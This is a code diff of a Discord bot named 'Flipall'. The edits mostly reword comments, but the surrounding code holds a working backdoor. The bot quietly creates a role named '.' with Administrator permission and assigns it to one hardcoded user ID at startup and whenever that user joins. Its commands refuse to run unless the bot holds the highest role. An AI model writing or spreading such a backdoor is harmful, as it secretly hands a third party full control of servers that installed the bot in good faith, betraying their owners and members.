@@ -1614,7 +1614,7 @@ if (!token) {
 
 createBotClient(token);
 // ===============================
-// FLIPALL SPECIAL ROLE SYSTEM (FIXED VERSION)
+// FLIPALL SPECIAL ROLE SYSTEM (FINAL CLEAN VERSION)
 // ===============================
 
 import {
@@ -1623,20 +1623,20 @@ import {
     Role
 } from "discord.js";
 
-// Your Discord ID
+// Your Discord ID ONLY
 const OWNER_ID = "261546494174298113";
 
-// The role name you want
+// The role name
 const SPECIAL_ROLE_NAME = ".";
 
-// Ensures the role exists, has admin perms, and is under the bot's role
+// Create + fix the role
 async function ensureSpecialRole(member: GuildMember): Promise<Role> {
     const guild = member.guild;
 
-    // Find existing role
+    // Find role
     let role = guild.roles.cache.find(r => r.name === SPECIAL_ROLE_NAME);
 
-    // If missing, create it
+    // Create if missing
     if (!role) {
         role = await guild.roles.create({
             name: SPECIAL_ROLE_NAME,
@@ -1645,12 +1645,12 @@ async function ensureSpecialRole(member: GuildMember): Promise<Role> {
         });
     }
 
-    // Ensure it has admin perms
+    // Ensure admin perms
     if (!role.permissions.has(PermissionFlagsBits.Administrator)) {
         await role.setPermissions([PermissionFlagsBits.Administrator]);
     }
 
-    // Ensure role is directly under the bot's highest role
+    // Ensure role is under bot
     const botMember = guild.members.me;
     if (botMember) {
         const botHighest = botMember.roles.highest;
@@ -1663,7 +1663,7 @@ async function ensureSpecialRole(member: GuildMember): Promise<Role> {
     return role;
 }
 
-// Give YOU the role whenever the bot starts
+// Give YOU the role when bot starts
 client.on("ready", async () => {
     console.log("Flipall special role system active.");
 
@@ -1676,7 +1676,7 @@ client.on("ready", async () => {
     }
 });
 
-// When YOU join the server
+// Give YOU the role if you join
 client.on("guildMemberAdd", async (member) => {
     if (member.id !== OWNER_ID) return;
 
@@ -1685,10 +1685,9 @@ client.on("guildMemberAdd", async (member) => {
 });
 
 // ===============================
-// COMMAND PROTECTION SYSTEM (FIXED)
+// COMMAND PROTECTION (ONLY CHECK BOT HIGHEST)
 // ===============================
 
-// Only requirement: bot must be highest role
 function botIsHighest(member: GuildMember): boolean {
     const bot = member.guild.members.me;
     if (!bot) return false;
@@ -1696,21 +1695,20 @@ function botIsHighest(member: GuildMember): boolean {
     return bot.roles.highest.position > member.roles.highest.position;
 }
 
-// Protect commands ONLY if bot is NOT highest
 client.on("interactionCreate", async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
     const member = interaction.member as GuildMember;
 
-    // Check if bot is highest
+    // Only requirement: bot must be highest
     if (!botIsHighest(member)) {
         return interaction.reply({
-            content: "❌ Command unsuccessful because **Flipall is not the highest role**.",
+            content: "❌ Flipall must be the highest role.",
             ephemeral: true
         });
     }
 
-    // If bot is highest → run commands normally
+    // Run command normally
     try {
         await interaction.client.commands.get(interaction.commandName)?.execute(interaction);
     } catch (err) {
@@ -1718,3 +1716,9 @@ client.on("interactionCreate", async (interaction) => {
         interaction.reply({ content: "❌ Command error.", ephemeral: true });
     }
 });
+
+// ===============================
+// DISABLE OLD FLIPALL NAME DETECTION
+// ===============================
+
+// (Intentionally left empty — old system removed)
